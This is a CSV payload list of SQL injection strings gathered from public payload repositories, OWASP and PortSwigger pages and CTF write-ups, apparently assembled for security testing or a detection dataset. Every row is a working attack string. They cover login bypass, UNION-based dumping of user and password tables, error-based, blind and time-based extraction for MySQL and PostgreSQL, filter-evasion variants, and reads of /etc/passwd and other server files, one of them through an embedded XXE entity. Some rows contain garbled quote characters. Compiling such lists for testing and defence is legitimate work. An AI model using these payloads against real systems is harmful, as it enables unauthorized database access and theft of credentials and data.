cve,tag,payload,url
,SQL Injection,""") or true--",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,) or true--,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection, or 'x'='x,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,) or ('x')=('x,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,)) or (('x'))=(('x,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,""" or ""x""=""x",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,""") or (""x"")=(""x",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,""")) or ((""x""))=((""x",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,or 2 like 2,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,or 1=1,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,or 1=1--,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,or 1=1#,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,or 1=1/*,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin' --,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin' -- -,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin' #,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin'/*,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin' or '2' LIKE '1,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin' or 2 LIKE 2--,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin' or 2 LIKE 2#,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin') or 2 LIKE 2#,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin') or 2 LIKE 2--,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin') or ('2' LIKE '2,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin') or ('2' LIKE '2'#,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin') or ('2' LIKE '2'/*,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin' or '1'='1,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin' or '1'='1'--,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin' or '1'='1'#,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin' or '1'='1'/*,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin'or 1=1 or ''=',https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin' or 1=1,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin' or 1=1--,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin' or 1=1#,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin' or 1=1/*,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin') or ('1'='1,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin') or ('1'='1'--,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin') or ('1'='1'#,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin') or ('1'='1'/*,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin') or '1'='1,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin') or '1'='1'--,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin') or '1'='1'#,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin') or '1'='1'/*,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"admin"" --",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,admin';--,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"admin"" #",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"admin""/*",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"admin"" or ""1""=""1",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"admin"" or ""1""=""1""--",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"admin"" or ""1""=""1""#",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"admin"" or ""1""=""1""/*",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"admin""or 1=1 or """"=""",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"admin"" or 1=1",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"admin"" or 1=1--",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"admin"" or 1=1#",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"admin"" or 1=1/*",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"admin"") or (""1""=""1",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"admin"") or (""1""=""1""--",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"admin"") or (""1""=""1""#",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"admin"") or (""1""=""1""/*",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"admin"") or ""1""=""1",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"admin"") or ""1""=""1""--",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"admin"") or ""1""=""1""#",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"admin"") or ""1""=""1""/*",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,1%09and%091=1%09--,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,1%0Dand%0D1=1%0D--,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,1%0Cand%0C1=1%0C--,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,1%0Band%0B1=1%0B--,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,1%0Aand%0A1=1%0A--,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,1%A0and%A01=1%A0--,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,1/*comment*/and/**/1=1/**/--,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,(1)and(1)=(1)--,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"1 and substring(version(),1,1)like(5)",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"1 and substring(version(),1,1)not in(4,3)",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"1 and substring(version(),1,1)in(4,3)",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"1 and substring(version(),1,1) between 3 and 4",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,1 aNd 1=1#,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,1 AnD 1=1#,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,1 AND 1=1#,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,(1)and(SELECT * from db.users)=(1),https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b)a,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection," and updatexml(null,concat(0x0a,version()),null)-- -",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection," and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--",https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
,SQL Injection,"1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--",https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
,SQL Injection,"1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--",https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
,SQL Injection,"1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--",https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
,SQL Injection,"1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--",https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
,SQL Injection,"1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--",https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
,SQL Injection,"1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--",https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
,SQL Injection,"1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--",https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
,SQL Injection,"1 and substring(version(),1,1)=5",https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
,SQL Injection,"1 and right(left(version(),1),1)=5",https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
,SQL Injection,"1 and left(version(),1)=4",https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
,SQL Injection,"1 and ascii(lower(substr(Version(),1,1)))=51",https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
,SQL Injection,"1 and (select mid(version(),1,1)=4)",https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
,SQL Injection,"1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'",https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
,SQL Injection,"1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'",https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
,SQL Injection," OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP ""^a.*"") THEN SLEEP(3) ELSE 1 END)); -- -",https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
,SQL Injection,"2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2",https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
,SQL Injection,"1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --",https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
,SQL Injection, UNION ALL SELECT LOAD_FILE('/etc/passwd') --,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
,SQL Injection,%A8%27 OR 1=1;--,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
,SQL Injection,%8C%A8%27 OR 1=1--,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
,SQL Injection,%bf' OR 1=1 -- --,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
,SQL Injection,1||(select 1 from pg_sleep(5)),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
,SQL Injection,1;(select 1 from pg_sleep(5)),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
,SQL Injection," and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1",https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
,SQL Injection, and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
,SQL Injection, and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
,SQL Injection, and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
,SQL Injection,",cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)",https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
,SQL Injection,",cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--",https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
,SQL Injection,",cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--",https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
,SQL Injection,",cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)",https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
,SQL Injection," and substr(version(),1,10) = 'PostgreSQL' and '1",https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
,SQL Injection,select 1 from pg_sleep(5),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
,SQL Injection,;(select 1 from pg_sleep(5)),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
,SQL Injection,||(select 1 from pg_sleep(5)),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
,SQL Injection,"-6475' UNION ALL SELECT CONCAT(0x716b6b7a71,0x457747586d6c447058555961796346724f727345527752594e76446c6b4f4841425165626571464d,0x716b787171)--",https://ctftime.org/writeup/24593
,SQL Injection,"0' union select '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]><book><id>0</id><name>n</name><author>a</author><year>0</year><link>l</link><flag>f</flag><excerpt>&xxe;</excerpt></book>' #",https://ctftime.org/writeup/24593
,SQL Injection,)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0A2)b%0Ajoin%0A(select%0A3)c)%0A%23,https://github.com/kahla-sec/CTF-Writeups/blob/master/Securinets%20Prequals%202k20/The%20after-Prequal/README.md
,SQL Injection,)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Atable_name%0AfRoM%0Ainformation_schema.tables)b%0Ajoin%0A(select%0A3)c)%0A%23,https://github.com/kahla-sec/CTF-Writeups/blob/master/Securinets%20Prequals%202k20/The%20after-Prequal/README.md
,SQL Injection,")union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Aload_file(""/var/lib/mysql-files/flag/flag.txt""))b%0Ajoin%0A(select%0A3)c)%0A%23",https://github.com/kahla-sec/CTF-Writeups/blob/master/Securinets%20Prequals%202k20/The%20after-Prequal/README.md
,SQL Injection,)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0A@@GLOBAL.secure_file_priv)b%0Ajoin%0A(select%0A3)c)%0A%23,https://github.com/kahla-sec/CTF-Writeups/blob/master/Securinets%20Prequals%202k20/The%20after-Prequal/README.md
,SQL Injection," UNION SELECT NULL,username_hrympe||':'||password_gxucte FROM users_zmlpng-- -",https://siunam321.github.io/ctf/portswigger-labs/SQL-Injection/sqli-9/
,SQL Injection,"admin'and unicode(substr((SELECT sql FROM sqlite_master WHERE type='table' limit 1,1),0,1))=a order by'",https://th3m7j0.medium.com/sqli-hackini-ctf-writeup-b29b2a0a6859
,SQL Injection,"1 un/**/ion se/**/lect 1,2,3--",https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF
,SQL Injection,"1 UnIoN/**/SeLecT/**/1,2,3--",https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF
,SQL Injection,"1 UNunionION SEselectLECT 1,2,3--",https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF
,SQL Injection,"1 uni%0bon se%0blect 1,2,3--",https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF
,SQL Injection,2 union select name from sqlol.ssn where name=0x4865727020446572706572--,https://portswigger.net/support/sql-injection-bypassing-common-filters
,SQL Injection,2 union selectselect name from sqlol.ssn where name='Herp Derper'--,https://portswigger.net/support/sql-injection-bypassing-common-filters
,SQL Injection,"9%09UNION%09SELECT%09pass,1,1,1%09FROM%09membres%09LIMIT%091",https://dyn20.gitbook.io/writeup-ctf/root-me/sql-injection-filter-bypass-1
,SQL Injection,9%09UNION%09SELECT%09*%09FROM%09((SELECT%09pass%09FROM%09membres%09LIMIT%091)A%09JOIN%09(SELECT%092)B%09JOIN%09(SELECT%093)C%09JOIN%09(SELECT%093)D),https://dyn20.gitbook.io/writeup-ctf/root-me/sql-injection-filter-bypass-2 
,SQL Injection," UNION SELECT 'a',NULL,NULL,NULL--",https://medium.com/@nishadbabu1015/sql-injection-470fba2b557a
,SQL Injection," UNION SELECT NULL,'a',NULL,NULL--",https://medium.com/@nishadbabu1015/sql-injection-470fba2b557a
,SQL Injection," UNION SELECT NULL,NULL,'a',NULL--",https://medium.com/@nishadbabu1015/sql-injection-470fba2b557a
,SQL Injection," UNION SELECT NULL,NULL,NULL,'a'--",https://medium.com/@nishadbabu1015/sql-injection-470fba2b557a
,SQL Injection, UNION SELECT NULL--,https://medium.com/@nishadbabu1015/sql-injection-470fba2b557a
,SQL Injection," UNION SELECT NULL,NULL--",https://medium.com/@nishadbabu1015/sql-injection-470fba2b557a
,SQL Injection,"UNION SELECT NULL,NULL,NULL--",https://medium.com/@nishadbabu1015/sql-injection-470fba2b557a
,SQL Injection," UNION SELECT 1, super_priv, 3, 4 FROM mysql.user -- -",https://medium.com/@nishadbabu1015/sql-injection-470fba2b557a
,SQL Injection," UNION SELECT 1, LOAD_FILE(??var/www/html/search.php??, 3, 4 ??-",https://medium.com/@nishadbabu1015/sql-injection-470fba2b557a
,SQL Injection,"admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=?™sqli_three??and TABLE_NAME=?™users??and COLUMN_NAME like ?˜a%?? --",https://medium.com/@nishadbabu1015/sql-injection-470fba2b557a
,SQL Injection,"admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = ?˜sqli_three??and table_name like ?˜a%?? --",https://medium.com/@nishadbabu1015/sql-injection-470fba2b557a
,SQL Injection," or SUBSTRING((SELECT id FROM users LIMIT 1 OFFSET 0), 1, 1) > 'm'--",https://medium.com/@nishadbabu1015/sql-injection-470fba2b557a
,SQL Injection,",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MySQL/payloads-sql-blind-MySQL-ORDER_BY.txt
,SQL Injection,",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MySQL/payloads-sql-blind-MySQL-ORDER_BY.txt
,SQL Injection,",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MySQL/payloads-sql-blind-MySQL-ORDER_BY.txt
,SQL Injection,",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MySQL/payloads-sql-blind-MySQL-ORDER_BY.txt
,SQL Injection,",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MySQL/payloads-sql-blind-MySQL-ORDER_BY.txt
,SQL Injection,",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MySQL/payloads-sql-blind-MySQL-ORDER_BY.txt
,SQL Injection,"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MySQL/payloads-sql-blind-MySQL-ORDER_BY.txt
,SQL Injection,"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MySQL/payloads-sql-blind-MySQL-ORDER_BY.txt
,SQL Injection,"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MySQL/payloads-sql-blind-MySQL-INSERT.txt
,SQL Injection,"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MySQL/payloads-sql-blind-MySQL-INSERT.txt
,SQL Injection,"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MySQL/payloads-sql-blind-MySQL-INSERT.txt
,SQL Injection,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MySQL/payloads-sql-blind-MySQL-INSERT.txt
,SQL Injection,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MySQL/payloads-sql-blind-MySQL-INSERT.txt
,SQL Injection,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MySQL/payloads-sql-blind-MySQL-INSERT.txt
